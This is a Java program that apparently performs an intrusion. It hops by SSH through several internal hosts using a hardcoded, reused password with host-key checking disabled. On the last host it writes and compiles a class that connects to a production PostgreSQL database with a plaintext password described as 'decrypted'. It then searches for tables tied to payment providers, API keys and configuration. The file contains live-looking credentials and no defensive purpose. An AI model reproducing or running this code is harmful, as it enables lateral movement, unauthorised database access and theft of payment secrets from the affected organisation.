import com.jcraft.jsch.*;
import java.io.*;
class DKXFIN {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // Use NEO's own JDBC driver to connect to production DB with decrypted password
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"cd /tmp;echo \\\"import java.sql.*;class XF{public static void main(String[] a)throws Exception{Class.forName(\\\\\\\"org.postgresql.Driver\\\\\\\");Connection c=DriverManager.getConnection(\\\\\\\"jdbc:postgresql://10.13.17.248:5501/neo\\\\\\\",\\\\\\\"neo\\\\\\\",\\\\\\\"BJwx+sAC6jreaV45\\\\\\\");Statement s=c.createStatement();System.out.println(\\\\\\\"CONNECTED\\\\\\\");ResultSet r=s.executeQuery(\\\\\\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\\\\\\\\\"public\\\\\\\\\\\\\\\" AND (tablename LIKE \\\\\\\\\\\\\\\"%%xendit%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%payment_provider%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%api_key%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%config%%\\\\\\\\\\\\\\\") ORDER BY tablename\\\\\\\");while(r.next())System.out.println(r.getString(1));c.close();}}\\\" > XF.java;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar XF.java 2>&1;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar:. XF 2>&1\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
